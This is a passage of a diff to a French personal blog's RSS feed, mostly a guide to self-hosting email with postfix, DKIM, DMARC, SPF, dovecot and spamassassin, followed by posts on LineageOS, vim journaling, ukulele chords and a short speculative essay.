+set realname = &quot;Eric&quot;
+# Génération du champs from
+set use_from = yes
+set smtp_url = &quot;smtp://user:password@mail.smtp2go.com:587&quot;
+set ssl_starttls = yes
+set edit_headers=yes
+set markers=no
+```
+
+# Option 2 postfix
+
+Tout ceci est réalisé sur une installation debian.
+
+$ apt install postfix mailutils rsyslog
+
+Note: rsyslog est nécessaire pour produire les mail.log
+
+Lors de l&#39;installation de postfix, choisir un type &quot;Internet Site&quot;.
+Puis lors de la demande du &quot;system mail name&quot;, indiquer votre domaine de
+messagerie (example.org).
+Voilà, à partir de ce point, notre serveur peut déjà envoyer du courrier
+! Mais attention, on risque d&#39;être &quot;vu&quot; comme un spammeur car on a rien
+configuré du tout. En particulier, DMARC (SPF + DKIM) qui permettent
+d&#39;authentifier la source (notre serveur) des emails. C&#39;est pas très
+difficile à mettre en place. On va voir ça plus tard. Pour éviter de se
+compliquer la vie, l&#39;utilisation d&#39;un smarthost (smtp2go par exemple)
+pour envoyer le courrier permet de s&#39;affranchir de ces questions de
+configuration pour rendre (plus) &quot;légitime&quot; notre serveur de messagerie.
+On peut tester un envoi de mail ainsi, mais il y a de très fortes chance
+qu&#39;on finisse dans le dossier spam :
+
+$ echo &quot;Salut, ça joue ?&quot;  | mail -s &quot;Email depuis mon serveur&quot; toi@email-externe.com 
+
+## Reverse DNS (rDNS)
+
+Très important pour un serveur de mail, le reverse DNS. Il doit être
+configuré pour refléter votre nom de domaine (example.org) sur les IPv4
+et IPv6 de votre serveur.
+
+Pour un serveur VPS OVH par exemple, suivre ce document [4].
+
+[4]: https://help.ovhcloud.com/csm/en-vps-configure-reverse-dns?id=kb_article_view&amp;sysparm_article=KB0047602
+
+## DKIM
+
+OpenDKIM va nous permettre de signer nos mails. C&#39;est quasiment
+obligatoire &quot;de nos jours&quot;.
+
+$ apt install opendkim opendkim-tools
+
+Générer un clé DKIM
+
+$ mkdir -p /etc/postfix/dkim
+$ opendkim-genkey -D /etc/postfix/dkim/ -d example.org -s mail
+$ chgrp opendkim /etc/postfix/dkim/*
+$ chmod g+r /etc/postfix/dkim/*
+
+Informons OpenDKIM que nous avons créé une clé privée.
+
+$ echo &quot;mail._domainkey.example.org example.org:mail:/etc/postfix/dkim/mail.private&quot; &gt; /etc/postfix/dkim/keytable
+
+Créons une &quot;signing table&quot;
+
+$ echo &quot;*@example.org mail._domainkey.example.org&quot; &gt; /etc/postfix/dkim/signingtable
+
+Ajoutons les &quot;trusted hosts&quot;
+
+$ echo &quot;127.0.0.1
+10.1.0.0/16
+1.2.3.4/24&quot; &gt; /etc/postfix/dkim/trustedhosts
+
+Configurons /etc/opendkim.conf. Attention, une ligne &quot;Socket&quot; existe
+déjà, il faudra donc la commenter.
+
+```
+KeyTable file:/etc/postfix/dkim/keytable
+SigningTable refile:/etc/postfix/dkim/signingtable
+InternalHosts refile:/etc/postfix/dkim/trustedhosts
+
+Canonicalization        relaxed/simple
+Socket                  inet:12301@localhost
+```
+
+Configurer postfix à l&#39;aide de ces commandes :
+
+$ postconf -e &quot;myhostname = $(cat /etc/mailname)&quot;
+$ postconf -e &quot;milter_default_action = accept&quot;
+$ postconf -e &quot;milter_protocol = 6&quot;
+$ postconf -e &quot;smtpd_milters = inet:localhost:12301&quot;
+$ postconf -e &quot;non_smtpd_milters = inet:localhost:12301&quot;
+
+Note : on vérifie la config postfix avec :
+
+$ postconf -p
+
+Redémarrer postfix et opendkim.
+
+$ systemctl restart opendkim
+$ systemctl enable opendkim
+$ systemctl reload postfix
+
+Configurer un enregistrement dns TXT pour DKIM.
+Utiliser cette commande pour obtenir l&#39;enregistrement à créer.
+
+$ echo -e &quot;
+
+v=DKIM1; k=rsa; $(tr -d &quot;
+&quot; &lt;/etc/postfix/dkim/mail.txt | sed &quot;s/k=rsa.* \&quot;p=/k=rsa; p=/;s/\&quot;\s*\&quot;//;s/\&quot;\s*).*//&quot; | grep -o &quot;p=.*&quot;)
+
+&quot;
+
+Le nom de l&#39;hôte pour cet enregistrement TXT est : mail._domainkey
+
+## DMARC
+
+Créer l&#39;utilisateur dmarc.
+
+$ useradd -m -G mail dmarc
+
+Ajouter un enregistrement DNS TXT dont vous obtiendrez le contenu avec
+cette commande :
+
+$ echo &quot;_dmarc.$(cat /etc/mailname)&quot;
+$ echo &quot;v=DMARC1; p=reject; rua=mailto:dmarc@$(cat /etc/mailname); fo=1&quot;
+
+La 1ere commande correspond au nom d&#39;hôte de l&#39;enregistrement TXT.
+La seconde ligne correspond au contenu de l&#39;enregistrement.
+
+## SPF
+
+Il suffit de créer un enregistrement dns TXT dont vous obtiendrez le
+contenu avec cette commande :
+
+$ cat /etc/mailname
+$ echo &quot;v=spf1 mx a:mail.$(cat /etc/mailname) -all&quot;
+
+1ere commande = le nom d&#39;hôte.
+2de commande = contenu de l&#39;enregistrement dns TXT.
+
+## Tester dmarc, dkim et spf
+
+Avec ce site https://appmaildev.com/en/spf 
+On vous demande d&#39;envoyer un mail sur une adresse fournie. Par exemple
+faire ceci :
+
+$ echo &quot;salut&quot; | mail -s &quot;test&quot; -r vous@example.org test-xxxxxx@appmaildev.com
+
+En principe, SPF, DKIM et DMARC devraient avoir un état &quot;PASS&quot;.
+
+## Hardening postfix
+
+$ postconf -e &#39;smtpd_recipient_restrictions = permit_sasl_authenticated, permit_mynetworks, reject_unauth_destination, reject_unknown_recipient_domain&#39;
+
+$ echo &quot;/^Received:.*/     IGNORE
+/^X-Originating-IP:/    IGNORE
+/^User-Agent:/        IGNORE
+/^X-Mailer:/        IGNORE&quot; &gt;&gt; /etc/postfix/header_checks
+
+$ postconf -e &quot;header_checks = regexp:/etc/postfix/header_checks&quot;
+
+## Config fail2ban
+
+$ apt-get install fail2ban
+$ cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
+
+Et alimenter /etc.fail2ban/jail.local avec
+
+```
+[postfix]
+
+enabled  = true
+port     = smtp,ssmtp,submission
+filter   = postfix
+logpath  = /var/log/mail.log
+
+
+[sasl]
+
+enabled  = true
+port     = smtp,ssmtp,submission,imap2,imap3,imaps,pop3,pop3s
+filter   = postfix-sasl
+# You might consider monitoring /var/log/mail.warn instead if you are
+# running postfix since it would provide the same log lines at the
+# &quot;warn&quot; level but overall at the smaller filesize.
+logpath  = /var/log/mail.warn
+maxretry = 1
+bantime  = 21600
+
+[dovecot]
+
+enabled = true
+port    = smtp,ssmtp,submission,imap2,imap3,imaps,pop3,pop3s
+filter  = dovecot
+logpath = /var/log/mail.log
+```
+
+Puis :
+
+$ systemctl restart fail2ban
+
+## Lire ses mails directement depuis le serveur ou installer un service IMAP ?
+
+Maintenant on a le choix :
+- soit on lit les mails directement sur le serveur avec mutt ou alpine
+  par exemple (configurer postfix pour livrer dans des maildirs)
+- soit on installe un serveur IMAP comme dovecot. Ceci rend possible la
+  lecture des mails depuis un smartphone, avec le client K9 par exemple.
+
+## postfix dans des maildirs
+
+L&#39;idée est de configurer un &quot;catchall&quot; pour que toutes les adresses du
+domaine soient dirigées dans une seule boîte. Il ne sera donc pas
+nécessaire de configurer de multiples comptes.
+
+Dans cette config, un dossier Maildir est créé dans le /home de
+l&#39;utilisateur.
+
+$ postconf -e &quot;home_mailbox = Maildir/&quot;
+$ echo &quot;@example.org root&quot; &gt; /etc/postfix/virtual
+$ postmap /etc/postfix/virtual
+$ postconf -e &quot;virtual_alias_maps = hash:/etc/postfix/virtual&quot;
+$ systemctl restart postfix
+
+Maintenant on peut lire nos mails depuis le compte root (ce n&#39;est pas
+une bonne idée, il faudrait créé un autre user unix) avec cette commande
+:
+
+$ mutt -f ~/Maildir/
+
+## Config mutt
+
+~/.muttrc
+set editor = &quot;vim -c &#39;set tw=72&#39; -c &#39;set wrap&#39;&quot;
+set edit_headers=yes
+set markers=no
+set mbox_type = Maildir
+set folder = ~/Maildir/
+set spoolfile = +/
+set realname = &quot;eric&quot;
+set from = &quot;eric@example.org&quot;
+set use_envelope_from = yes
+set edit_headers = yes # Will allow us to change the from address from Mutt
+set record = +/sent/
+set sort = threads
+auto_view text/html # view html automatically
+alternative_order text/plain text/enriched text/html
+
+## Améliorer postix
+
+Utilisons des certificats publiques pour chiffrer nos canaux de
+communications.
+
+$ apt install certbot
+$ certbot certonly --standalone -d example.org
+
+
+$ postconf -e &#39;smtpd_tls_cert_file = /etc/letsencrypt/live/&lt;your.domain&gt;/fullchain.pem&#39;
+$ postconf -e &#39;smtpd_tls_key_file = /etc/letsencrypt/live/&lt;your.domain&gt;/privkey.pem&#39;
+
+$ postconf -e &quot;smtp_use_tls=yes&quot;
+
+
+# Dovecot
+
+Pour lire ses emails à distance (je veux dire sans être connecté en ssh
+sur son serveur), il nous faut un serveur imap ou pop. Utilisons
+dovecot, un serveur imap.
+
+$ apt install dovecot-imapd dovecot-sieve spamassassin spamc
+
+## Configuration
+
+Faire un backup de la configuration d&#39;origine et utiliser celle-ci.
+
+/etc/dovecot/dovecot.conf
+```
+# Note that in the dovecot conf, you can use:
+# %u for username
+# %n for the name in name@domain.tld
+# %d for the domain
+# %h the user&#39;s home directory
+
+# Connections between the mail client and Dovecot needs to be encrypted
+ssl = required
+ssl_cert = &lt;/etc/letsencrypt/live/mail.example.org/fullchain.pem
+ssl_key = &lt;/etc/letsencrypt/live/mail.example.org/privkey.pem
+ssl_min_protocol = TLSv1.2
+ssl_cipher_list = EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA256:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EDH+aRSA+AESGCM:EDH+aRSA+SHA256:EDH+aRSA:EECDH:!aNULL:!eNULL:!MEDIUM:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!RC4:!SEED
+ssl_prefer_server_ciphers = yes
+ssl_dh = &lt;/usr/share/dovecot/dh.pem
+auth_mechanisms = plain login
+auth_username_format = %n
+
+protocols = $protocols imap
+
+# Search for valid users in /etc/passwd
+userdb {
+    driver = passwd
+}
+#Fallback: Use plain old PAM to find user passwords
+passdb {
+    driver = pam
+}
+
+# Our mail for each user will be in ~/Mail, and the inbox will be ~/Mail/Inbox
+mail_location = maildir:~/Mail:INBOX=~/Mail/Inbox:LAYOUT=fs
+namespace inbox {
+    inbox = yes
+    mailbox Drafts {
+    special_use = \Drafts
+    auto = subscribe
+}
+    mailbox Junk {
+    special_use = \Junk
+    auto = subscribe
+    autoexpunge = 30d
+}
+    mailbox Sent {
+    special_use = \Sent
+    auto = subscribe
+}
+    mailbox Trash {
+    special_use = \Trash
+}
+    mailbox Archive {
+    special_use = \Archive
+}
+}
+
+# Here we let Postfix use Dovecot&#39;s authetication system.
+service auth {
+  unix_listener /var/spool/postfix/private/auth {
+    mode = 0660
+    user = postfix
+    group = postfix
+}
+}
+
+protocol lda {
+  mail_plugins = $mail_plugins sieve
+}
+protocol lmtp {
+  mail_plugins = $mail_plugins sieve
+}
+plugin {
+	sieve = ~/.dovecot.sieve
+	sieve_default = /var/lib/dovecot/sieve/default.sieve
+	sieve_dir = ~/.sieve
+	sieve_global_dir = /var/lib/dovecot/sieve/
+}
+```
+-- end of dovecot.conf -------------
+
+Quelques explications :
+1. Config SSL pour permettre les communications chiffrées
+2. Le serveur mail va authentifier les utilisateurs grâce à PAM, ce qui
+signifie que les utilisateurs créés sur le serveur pourront recevoir du
+courrier (il faut qu&#39;ils soient dans le groupe mail).
+3. Config des dossiers par défaut.
+4. Config d&#39;un listener unix qui va permettre à Postfix d&#39;authentifier
+les utilisateurs via dovecot.
+5. Configure le plugin sieve de dovecot qui fournit des fonctions de
+filtrage de mails au moment de la livraison finale. Les scripts sieve
+peuvent être utilisés pour personnaliser la manière dont un message est
+livré.
+
+
+## Configuration de sieve
+
+Pour déplacer les mails tagués spam directement dans le dossier junk.
+
+$ mkdir -p /var/lib/dovecot/sieve
+$ echo &quot;require [\&quot;fileinto\&quot;, \&quot;mailbox\&quot;];
+if header :contains \&quot;X-Spam-Flag\&quot; \&quot;YES\&quot;
+        {
+                fileinto \&quot;Junk\&quot;;
+        }&quot; &gt; /var/lib/dovecot/sieve/default.sieve
+
+Créer un user vmail qui accédera aux emails. Mettre à jour ensuite la
+config sieve.
+
+$ grep -q &#39;^vmail:&#39; /etc/passwd || useradd vmail
+$ chown -R vmail:vmail /var/lib/dovecot
+$ sievec /var/lib/dovecot/sieve/default.sieve
+
+Activer l&#39;authentification pam pour dovecot.
+
+$ echo &quot;auth    required        pam_unix.so nullok
+account required        pam_unix.so&quot; &gt;&gt; /etc/pam.d/dovecot
+
+## Connecter postfix et dovecot
+
+On indique à postfix d&#39;utiliser dovecot pour authentifier les
+utilisateurs.
+
+$ postconf -e &#39;smtpd_sasl_auth_enable = yes&#39;
+$ postconf -e &#39;smtpd_sasl_type = dovecot&#39;
+$ postconf -e &#39;smtpd_sasl_path = private/auth&#39;
+$ postconf -e &#39;mailbox_command = /usr/lib/dovecot/deliver&#39;
+
+Puis redémarrer dovecot :
+
+$ systemctl restart dovecot
+
+
+## Connecter postfix et spamassassin
+
+On modifie master.cf pour que postfix route les mails dans spamassassin.
+
+$ sed -i &#39;/^\s*-o/d;/^\s*submission/d;/^\s*smtp/d&#39; /etc/postfix/master.cf
+
+Puis :
+
+$ echo &quot;smtp unix - - n - - smtp
+smtp inet n - y - - smtpd
+  -o content_filter=spamassassin
+submission inet n       -       y       -       -       smtpd
+  -o syslog_name=postfix/submission
+  -o smtpd_tls_security_level=encrypt
+  -o smtpd_sasl_auth_enable=yes
+  -o smtpd_tls_auth_only=yes
+smtps     inet  n       -       y       -       -       smtpd
+  -o syslog_name=postfix/smtps
+  -o smtpd_tls_wrappermode=yes
+  -o smtpd_sasl_auth_enable=yes
+spamassassin unix -     n       n       -       -       pipe
+  user=debian-spamd argv=/usr/bin/spamc -f -e /usr/sbin/sendmail -oi -f \${sender} \${recipient}&quot; &gt;&gt; /etc/postfix/master.cf
+
+Et on redémarre postfix.
+
+$ systemctl restart postfix
+
+## Créer un utilisateur
+
+Tout utilisateur qui doit recevoir du courrier doit être dans le groupe
+&quot;mail&quot;.
+
+$ useradd -m -G mail eric
+$ passwd eric
+
+Dans votre client de messagerie, le compte utilisateur sera ce nom de
+compte unix que vous définissez ici.
+
+## Client de messagerie imap
+
+Il faudra configurer :
+- le serveur entrant IMAP (mail.example.org)
+- le serveur sortant SMTP (mail.example.org) avec STARTTLS.
+
+## Mutt
+
+Il reste possible de relever ces mails avec Mutt, directement sur le
+serveur. Le dossier contenant les maildirs alimentés par dovecot est
+~/Mail/Inbox et ~/Mail/Junk.
+
+$ mutt -f ~/Mail/Inbox</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-10-email-auto-heberge.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-14 10:56:03 CET</pubDate>
+  <category>2023/11/14/2</category>
+  <title>Dégugeulisation</title>
+  <link>http://3r1c.net/posts/2023-11-14-degougueulisation.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Je ne pensais pas pouvoir me passer d&#39;android et des produits google sur
+mon smartphone, mais j&#39;ai découvert LineageOS : un android dépourvu des
+fioritures et autres merdouilles assoiffées de données personnelles.
+
+Pour installer LineageOS sur un Google Pixel 5, il suffit de suivre le
+mode OP [1], c&#39;est assez simple. Il faut peut être y consacrer 1 heure
+le temps d&#39;appréhender les outils ADB et FASTBOOT [2].
+
+Maintenant j&#39;ai un Pixel 5 sans Google. Je viens d&#39;installer le
+gestionnaire d&#39;application F-Droid. Et je peux utiliser mes applis
+préférées : NewPipe, OrganicMaps, Mull, SkyMap, Glider for Hacker News.
+
+Du côté des fonctionnalités que j&#39;avais à &quot;reproduire&quot; :
+- la synchro des photos se fait avec Syncthing (que j&#39;utilise depuis
+  bien longtemps).
+- la synchro des contacts avec DecSync.
+- Musique spotify avec Spotube.
+- andoid auto : possible de l&#39;installer, mais je ne sais pas si je vais
+  tester
+
+Pour exporter les contacts de gueulassemail.com, il y a une fonction
+pour exporter un .vcf. Ce fichier peut ensuite être importé dans l&#39;app
+contact de LineageOS.
+
+[1]: https://wiki.lineageos.org/devices/redfin/install
+[2]: https://wiki.lineageos.org/adb_fastboot_guide</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-14-degougueulisation.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-15 10:56:03 CET</pubDate>
+  <category>2023/11/15/3</category>
+  <title>Le "savoir procéder"</title>
+  <link>http://3r1c.net/posts/2023-11-15-savoir-proceder.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Là où je bosse, certains crient haut et fort que nous ne sommes qu&#39;une
+bande d&#39;incapables désorganisés. Ils martèlent jour après jour à quel
+point l&#39;organisation est foireuse et déplorent que personne ne mette de
+l&#39;ordre dans cet enfer. &quot;Pourquoi ce n&#39;est pas géré comme d&#39;habitude ?&quot;,
+&quot;Qui est la personne référente ?&quot;, &quot;Comment gérez vous ça ?&quot;. Autant de
+questions légitimes bien évidemment, mais qui ne trouvent étrangement
+jamais de réponses, alors pourquoi ?  Dans une &quot;organisation&quot; justement,
+je pense que nous savons plusieurs typologies d&#39;expertises requises. On
+connait tous le &quot;savoir faire&quot;. Celui qui sait comment faire
+concrètement. 
+On connait moins le &quot;savoir concevoir&quot;, celui qui sait comment
+construire ce qui doit être fait. Et je vois malgré moi qu&#39;on ne connait
+pas du tout le &quot;savoir procéder&quot;. Celui qui sait comment on va procéder.
+Le procédé au sens &quot;procédural&quot;. C&#39;est celui qui sait qui va faire quoi
+et quand. Et justement, ce sont bien les personnes qui devraient
+posséder ce &quot;savoir procéder&quot; qui ne voient que de la désorganisation
+partout. 
+Pire encore, ceux-ci vont insister pour qu&#39;une tâche soit effectuée
+rapidement, sans grand design conceptuel, et sans jamais aucune
+procédure, ni aucune organisation.  C&#39;est affligeant.  Voilà pourquoi,
+les questions d&#39;organisation ne trouvent jamais de réponse.  Ceux qui
+sont censé porter ce savoir, n&#39;en ont pas conscience.  Ils sont
+malheureusement résolument tournés vers le &quot;savoir faire&quot;. </pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-15-savoir-proceder.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-18T21:03:07Z 10:56:03 CET</pubDate>
+  <category>2023/11/18/6</category>
+  <title>Shinobi website</title>
+  <link>http://3r1c.net/posts/2023-11-18-shinobi-website.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>J&#39;ai décidé de passer sur un weblog &quot;shinobi&quot;, qui correspond plus à ce
+que j&#39;attends d&#39;un site web. Il s&#39;agit d&#39;une page rss, qui présente tous
+les articles (du weblog), articles qui étaient stockés dans un format
+.txt depuis longtemps.
+
+Toutes les infos sont ici : https://shinobi.bt.ht/
+
+Tout ce qui est lisible ici est rédigé sous vim, avec une largeur de
+colonne de maximum 72 caractères. Grâce à ceci dans mon ~/.vimrc :
+
+autocmd FileType text setlocal textwidth=72
+
+Si par aventure je devais revenir sur un textwidth &quot;normal&quot;, je peux :
+
+:set tw=0
+
+Pour connaitre le textwidth en cours :
+
+:set tw?
+
+Et pour revenir à une limite de 72 caractères :
+
+:set tw=72
+
+Pour &quot;reformatter&quot; un texte qui doit devenir d&#39;une largeur maxi de 72
+caractères ; sélectionner les lignes avec SHIFT+V, puis : `gq`.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-18-shinobi-website.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-19T17:35:10Z 10:56:03 CET</pubDate>
+  <category>2023/11/19/7</category>
+  <title>La vie en rose ukulélé</title>
+  <link>http://3r1c.net/posts/2023-11-19-la-vie-en-rose.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>La vie en rose
+==============
+
+_Note_ = 2 temps au lieu de 4.
+
+ G    Gmaj7   G6     Am7    D
+||||   ||||   ||||   ||||   ||||
+|o|o   |ooo   |o|o   ||||   ooo|
+||o|   ||||   ||||   ||||   ||||
+||||   ||||   ||||   ||||   ||||
+
+G                          Gmaj7
+Quand il me prend dans ses bras
+                G6
+Il me parle tout bas
+                  _Am7_  _D_
+Je vois la vie en ro - se
+
+Am      D     Gdim
+||||   ||||   |o|o
+o|||   ooo|   ||||
+||||   ||||   ||||
+||||   ||||   ||||
+
+Am                  D
+Il me dit des mots d&#39;amour
+                     _Am_
+Des mots de tout les jours
+   _D_         _Gdim_ _D_
+Et ça me fait quelque chose
+
+
+ G    Gmaj7   G6     G7     C 
+||||   ||||   ||||   ||o|   ||||
+|o|o   |ooo   |o|o   |o|o   ||||
+||o|   ||||   ||||   ||||   |||o
+||||   ||||   ||||   ||||   ||||
+
+G                     Gmaj7
+Il est entré dans mon coeur
+               _G6_
+Une part de bonheur
+     G7            C
+Dont je connais la cause
+
+Cm      G     A7     Am7     D  
+||||   ||||   |o||   ||||   ||||
+||||   |o|o   ||||   ||||   ooo|
+|ooo   ||o|   ||||   ||||   ||||
+||||   ||||   ||||   ||||   ||||
+
+Cm
+C&#39;est lui pour moi
+         G
+Moi pour lui dans la vie
+A7                 _Am7_         _D_
+Il me l&#39;a dit, l&#39;a juré pour la vie
+
+ G    Gmaj7    Am      D      
+||||   ||||    ||||   ||||
+|o|o   |ooo    o|||   ooo|
+||o|   ||||    ||||   ||||
+||||   ||||    ||||   ||||
+
+G              Gmaj7
+Et dès que je l&#39;aperçois
+                 [Am,  D   Am    D   G ]
+Alors je sens en moi, mon coeur qui bat...</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-19-la-vie-en-rose.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-19 10:56:03 CET</pubDate>
+  <category>2023/11/19/7</category>
+  <title>Le monde de demain (4) - Ce que le monde redoute</title>
+  <link>http://3r1c.net/posts/2023-11-19-le-monde-de-demain-4.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Ce billet fait partie d&#39;un essai que j&#39;ai nommé &quot;Le monde de demain&quot;.
+
+Ce que le monde redoute
+=======================
+
+Vers 2055, le manque de pétrole a provoqué des difficultés
+d&#39;approvisionnement en uranium. Le précieux &quot;combustible&quot; ne parvenait
+plus que difficilement pour la plupart des pays équipés de réacteurs
+nucléaires.
+Plusieurs d&#39;entre eux ont dû entamer la procédure d&#39;arrêt. Pourquoi
+a-t-on besoin d&#39;une procédure d&#39;arrêt ? Eh bien tout simplement par ce
+qu&#39;un réacteur nucléaire a besoin d&#39;être refroidi avant d&#39;être
+complètement stoppé. Et le refroidissement se déroule sur 4 mois.
+Peu de voiture pouvait encore se déplacer, quelques véhicules
+électriques pouvaient toujours conduire les ingénieurs dans les
+centrales, dont le personnel était réquisitionné. Il fût difficile de
+faire appliquer cette réquisition quand la police elle même n&#39;avait plus
+de moyen de locomotion.
+Dans certains pays, il fût tout simplement impossible de véhiculer les
+ingénieurs, habitant à plusieurs dizaines de kilomètres de la centrale.
+Surtout qu&#39;il fallait le faire pendant 4 mois. 
+Comment conduire les ingénieurs sur place ? Et comment refroidir le cœur
+des réacteurs sans électricité ni pétrole pour faire tourner les pompes
+à eau ?
+D&#39;autres pays on dû faire fasse à un autre obstacle de taille : le
+manque d&#39;eau des fleuves et rivières. Les centrales sont construites au
+bord de cours d&#39;eau justement pour permettre le refroidissement des
+réacteurs, par le prélèvement d&#39;eau.
+Le manque d&#39;eau et les difficultés à mobiliser les personnes compétentes
+ont engendré plusieurs catastrophes nucléaires, avec des conséquences
+pour l&#39;ensemble des vivants de la planète.</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-19-le-monde-de-demain-4.txt</guid>
+  </item>
+<item>
+<pubDate>2023-11-25T15:30:25Z 10:56:03 CET</pubDate>
+  <category>2023/11/25/6</category>
+  <title>Plain text journaling</title>
+  <link>http://3r1c.net/posts/2023-11-25-plain-text-journaling.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>J&#39;utilise actuellement un système maison pour organiser mes tâches. Un
+ensemble de script bash minimalistes. J&#39;ai récemment découvert cet
+article [1] qui me permet d&#39;apporter des améliorations. Notamment une
+coloration visuelle des tâches en cours, terminées ou reportées.
+
+[1]: https://peppe.rs/posts/plain_text_journaling/
+
+Structure des fichiers
+======================
+Un dossier &quot;journal&quot; contenant des dossiers par années, eux même
+contenant un fichier texte par jour.
+
+journal/
+|
+|-- 2023/
+|    |- 01
+|    |- 02
+|    |- 03
+|    |-...
+|-- 2024/
+|    |- 01
+|    |- 02
+|    |- 03
+|    |-...
+
+Ouvrons un fichier...
+
+$ vim journal/2023/11
+
+Puis ajoutons en en-tête le calendrier et les numéros de semaines, grâce
+à la commande cal.
+
+:read !cal -mw
+
+Ce qui nous donne ceci :
+
+     November 2023
+   Mo Tu We Th Fr Sa Su
+44        1  2  3  4  5
+45  6  7  8  9 10 11 12
+46 13 14 15 16 17 18 19
+47 20 21 22 23 24 25 26
+48 27 28 29 30
+
+Notons que pour afficher le calendrier d&#39;un mois en particulier, il
+suffit de :
+
+:read !cal -mw december
+
+Ensuite, ajouter des sections, pour gérer les tâches semaines par
+semaines.
+
+SEMAINE1 -------------
+
+done Tâche terminée
+todo Tâche à faire
+&gt; Tâche reportée
+- Ceci est une note
+
+SEMAINE2 -------------
+
+done Tâche terminée
+todo Tâche à faire
+&gt; Tâche reportée
+- Ceci est une note
+
+Chaque tâche de la liste est préfixée pour en définir son état : &quot;done&quot;,
+&quot;todo&quot;, &quot;reportée&quot;. Il reste aussi le moyen de définir une &quot;note&quot;.
+
+Grâce aux abbreviations de vim, on va pouvoir transformer le texte
+&quot;done&quot; et &quot;todo&quot; en petit &quot;picto&quot; respectivement : × et ·
+Ajoutons ceci dans notre .vimrc
+
+autocmd vimenter */journal/* abbrev todo ·
+autocmd vimenter */journal/* abbrev done ×
+
+Maintenant, todo et done sont remplacé automatiquement par les petits
+pictos.
+
+Nous avons la possibilité de trier les types d&#39;items en sélectionnant la
+liste et en utilisant `:gq`. Pour ce faire, ajouter ceci au .vimrc.
+
+autocmd vimenter */journal/* set formatprg=sort\ -V
+
+
+Coloration syntaxique
+=====================
+
+C&#39;est la nouveauté de mon côté. Colorer les items selon leur statut.
+
+&quot;&quot; syntax highlighting
+augroup JournalSyntax
+    autocmd!
+    autocmd BufReadPost */journal/* set filetype=journal
+
+    autocmd BufReadPost */journal/* syntax match JournalAll /.*/                 &quot; captures the entire buffer
+    autocmd BufReadPost */journal/* syntax match JournalDone /^×.*/              &quot; lines containing &#39;done&#39; items:  ×
+    autocmd BufReadPost */journal/* syntax match JournalTodo /^·.*/              &quot; lines containing &#39;todo&#39; items:  ·
+    autocmd BufReadPost */journal/* syntax match JournalEvent /^o.*/             &quot; lines containing &#39;event&#39; items: o
+    autocmd BufReadPost */journal/* syntax match JournalNote /^- .*/             &quot; lines containing &#39;note&#39; items:  -
+    autocmd BufReadPost */journal/* syntax match JournalMoved /^&gt;.*/             &quot; lines containing &#39;moved&#39; items: &gt;
+    autocmd BufReadPost */journal/* syntax match JournalHeader /^\&lt;\u\+\&gt;.*/     &quot; lines starting with caps
+
+    autocmd BufReadPost */journal/* highlight JournalAll    ctermfg=103
+    autocmd BufReadPost */journal/* highlight JournalHeader ctermfg=250
+    autocmd BufReadPost */journal/* highlight JournalDone   ctermfg=8
+    autocmd BufReadPost */journal/* highlight JournalEvent  ctermfg=6               &quot; cyan
+    autocmd BufReadPost */journal/* highlight JournalMoved  ctermfg=5               &quot; pink
+    autocmd BufReadPost */journal/* highlight JournalNote   ctermfg=3               &quot; yellow
+    autocmd BufReadPost */journal/* highlight VertSplit     ctermfg=0  ctermbg=0    &quot; hide vert splits
+augroup END
+
+
+Utilisation
+===========
+
+Ouvrir le mois en cours.
+
+$ vim $(date +&quot;%Y/%m&quot;)
+
+Ouvrir plusieurs mois en même temps avec une séparation verticale.
+
+$ vim -O journal/2023/0{1,2,3}
+
+Ouvrir les 2 mois avant et les 2 mois suivants.
+
+$ vim -O $(
+  dateseq \
+      &quot;$(date --date &quot;2 months ago&quot; +%Y/%m)&quot; \
+      &quot;$(date --date &quot;2 months&quot; +%Y/%m)&quot; \
+      -i %Y/%m \
+      -f %Y/%m
+)§
+
+
+Crédits
+=======
+
+nerdy at peppe.rs
+https://peppe.rs/posts/plain_text_journaling/</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2023-11-25-plain-text-journaling.txt</guid>
+  </item>
+<item>
+<pubDate>2023-12-08T13:11:20Z 10:56:03 CET</pubDate>
+  <category>2023/12/08/5</category>
+  <title>DWM</title>
+  <link>http://3r1c.net/posts/2023-12-08-dwm.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'># Intro
+
+# Xsessions
+
+Comme j&#39;ai déjà gnome, on va ajouter une entrée à gdm. 
+Créer le fichier /usr/share/xsessions/dwm.desktop                                
+
+[Desktop Entry]
+Encoding=UTF-8
+Name=Dwm
+Comment=Dynamic window manager
+Exec=/usr/local/bin/dwm
+Icon=dwm
+Type=XSession
+
+# Touchpad
+
+Activer le déroulement &quot;naturel&quot;.
+
+/etc/X11/xorg.conf.d/01-touchpad.conf 
+
+Section &quot;InputClass&quot;
+    Identifier &quot;touchpad&quot;
+    MatchIsTouchpad &quot;on&quot;
+    Option &quot;Tapping&quot; &quot;on&quot;
